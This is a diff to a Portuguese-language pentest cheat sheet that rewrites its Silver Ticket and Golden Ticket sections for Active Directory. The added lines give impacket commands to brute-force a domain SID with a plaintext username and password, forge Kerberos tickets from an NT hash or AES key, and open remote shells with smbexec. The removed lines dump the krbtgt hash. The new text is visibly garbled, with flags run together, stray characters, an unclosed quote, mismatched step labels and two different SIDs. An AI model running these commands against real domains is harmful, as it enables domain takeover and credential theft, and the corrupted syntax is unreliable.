@@ -9153,15 +9153,26 @@ Gerar arquivo Criptografado com tipo de imagem para o pentest
  
 `Silver Ticket` PRECISA DO NT HASH do Serviço, DOMAIN SID, SPN
 
-    ticketer.py -nthash HASE-NT-HERE -domain-sid SID-DOMAIN-HERE -domain floripa.local -spn SPN/HERE.floripa.local fake_user
-    export KRB5CCNAME='/Path/fake_user.ccache'
-    psexec.py -k HOST.floripa.local
+	1. Listar os SPNS
+	impacket-lookupsid praias.floripa.local/neuzilene:butterfly@floripa.local
+	[*] Brute forcing SIDs at floripa.local
+	[*] StringBinding ncacn_np:floripa.local[\pipe\lsarpc]
+	[*] Domain SID is: S-1-5-21-1896877299-4210702954-2786525702
+	2. Obter o domain SID
+	impacket-ticketer -nthash '6c30e721246ae60827be77d5a0a18bcd'-domain-sid
+	'S-1-5-21-1980580726-21645356-2339943263'-domain praias.floripa.local-spn
+	CIFS/ingleses. praias.floripa.local fake_user
+	3. Obter um Silver Ticket
+	export KRB5CCNAME='fake_user.ccache'
+	impacket-smbexec -k ingleses.praias.floripa.local
 
 `Golden Ticket` PRECISA DO NT HASH do KRBTGT (HASH MAIS IMPOSTANTE DO AD)
 
-    ticketer.py -nthash HASE-NT-HERE -domain-sid SID-DOMAIN-HERE -domain floripa.local -spn SPN/HERE.floripa.local fake_user
-    export KRB5CCNAME='/Path/fake_user.ccache'
-    secretsdump.py -k dc01.floripa.local -just-dc-ntlm -just-dc-user krbtgt
+	Obtendo o ticket e utilizando o ticket
+	impacket-ticketer-aesKey xxXx-domain-sid S-1-5-21-xxX-xxX-XXX·
+	domain xxx.Xx.Xx-user-id 500 -extra-pac-duration 1 administrator
+	export KRB5CCNAME='administrator.ccache
+	impacket-smbexec-k xxx.Xx.xxt
 
 `Ataques a Certificados Active Directory AD` REQUISITO É ACHAR A WEB RODANDO O CERTFNSH FAZER UM MAN IN THE MIDDLE PARA PEGAR AS HASHES E USUARIOS SEM CREDS VALIDAS
 
